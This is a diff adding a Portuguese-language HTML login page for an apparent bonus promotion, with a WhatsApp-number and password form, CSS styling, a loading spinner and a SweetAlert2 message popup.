@@ -1,0 +1,204 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cadastra-se e ganhe 25R$ de bonus!</title>
+    <link rel="stylesheet" href="css/all.min.css">
+  
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+
+
+ 
+  
+<style>
+html, body {
+  margin: 0;
+  padding: 0;
+  width: 100%;
+  min-height: 100vh;
+  max-width: 100vw;
+  font-family: 'Segoe UI', sans-serif;
+  background: #ffffff url('images/fundobolsa.png') no-repeat center center fixed;
+  background-size: cover;
+  color: #222;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  overflow-x: hidden;
+}
+
+.cadastro-container {
+  background: #ffffff;
+  padding: 24px 16px;
+  border-radius: 14px;
+  width: 92%;
+  max-width: 320px;
+  box-shadow: 0 0 12px rgba(0, 0, 0, 0.10);
+  border: 1px solid #e0e0e0;
+  position: relative;
+  margin-top: 20px;
+}
+
+.cadastro-container h2 {
+  text-align: center;
+  color: #1b3e1b;
+  font-size: 22px;
+  font-weight: 600;
+  margin-bottom: 20px;
+}
+
+.input-label {
+  font-size: 14px;
+  font-weight: 600;
+  margin: 14px 0 6px;
+  color: #333;
+  display: block;
+}
+
+.input-group {
+  position: relative;
+  display: flex;
+  align-items: center;
+  background: #f9f9f9;
+  border: 1px solid #ccc;
+  border-radius: 10px;
+  padding: 10px 14px;
+  margin-bottom: 16px;
+  transition: 0.3s ease;
+}
+
+.input-group:focus-within {
+  border-color: #2c6e49;
+  box-shadow: 0 0 0 2px #2c6e4933;
+}
+
+.input-group i {
+  margin-right: 10px;
+  color: #2c6e49;
+  font-size: 16px;
+  min-width: 20px;
+}
+
+.input-group input {
+  flex: 1;
+  border: none;
+  background: transparent;
+  outline: none;
+  font-size: 15px;
+  color: #222;
+}
+
+.input-group input::placeholder {
+  color: #888;
+}
+
+.btn {
+  width: 100%;
+  padding: 13px;
+  border: none;
+  border-radius: 12px;
+  background: linear-gradient(135deg, #1e5128, #32793a);
+  color: white;
+  font-weight: bold;
+  font-size: 16px;
+  cursor: pointer;
+  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+  margin-top: 10px;
+  transition: 0.3s;
+}
+
+.btn:hover {
+  background: linear-gradient(135deg, #286d3c, #3d8c4b);
+}
+
+.footer {
+  text-align: center;
+  margin-top: 18px;
+  font-size: 13px;
+  color: #555;
+}
+
+.footer a {
+  color: #1c5a27;
+  text-decoration: none;
+  font-weight: bold;
+}
+
+.footer a:hover {
+  text-decoration: underline;
+}
+
+.spinner {
+  display: none;
+  border: 4px solid rgba(0, 0, 0, 0.1);
+  border-top: 4px solid #2c6e49;
+  border-radius: 50%;
+  width: 36px;
+  height: 36px;
+  animation: spin 1s linear infinite;
+  margin: 24px auto 0;
+}
+
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+
+</style>
+</head><body><div class="cadastro-container" id="cadastroContainer">
+  <img src="images/bolsa.png" alt="Banner Promo" style="width: 100%; border-radius: 40px; margin-bottom: 5px;">
+  <h2>Faça login para acessar sua conta</h2>
+  <form action="/index.php" method="post" onsubmit="return mostrarCarregando()">
+    <label class="input-label">WhatsApp</label>
+    <div class="input-group">
+      <i class="fab fa-whatsapp"></i>
+      <input type="tel" name="telefone" placeholder="(00) 00000-0000" required="">
+    </div>
+
+    <label class="input-label">Senha</label>
+    <div class="input-group">
+      <i class="fa fa-lock"></i>
+      <input type="password" name="senha" placeholder="Digite sua senha" required="">
+    </div>
+
+    <div class="spinner" id="spinner"></div>
+    <button type="submit" class="btn">Entrar</button>
+    <div class="footer">
+      Não tem uma conta? <a href="../cadastro/">Cadastre-se</a>
+    </div>
+  </form>
+</div>
+
+    <script>
+   function mostrarCarregando() {
+    setTimeout(() => {
+        document.querySelector('.btn').style.display = 'block';
+        document.getElementById('spinner').style.display = 'none';
+    }, 6000); // volta o botão depois de 6 segundos
+    document.querySelector('.btn').style.display = 'none';
+    document.getElementById('spinner').style.display = 'block';
+}
+
+    </script>
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+<script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const message = urlParams.get('message');
+    const toastType = urlParams.get('toastType');
+
+    if (message && toastType) {
+        Swal.fire({
+            icon: toastType === 'danger' ? 'error' : toastType,
+            title: toastType === 'danger' ? 'Erro!' : 'Aviso',
+            text: decodeURIComponent(message),
+            confirmButtonColor: '#3179f9',
+            background: '#1e1e1e',
+            color: '#ffffff'
+        });
+    }
+</script>
+
+
+
+
+</body></html>
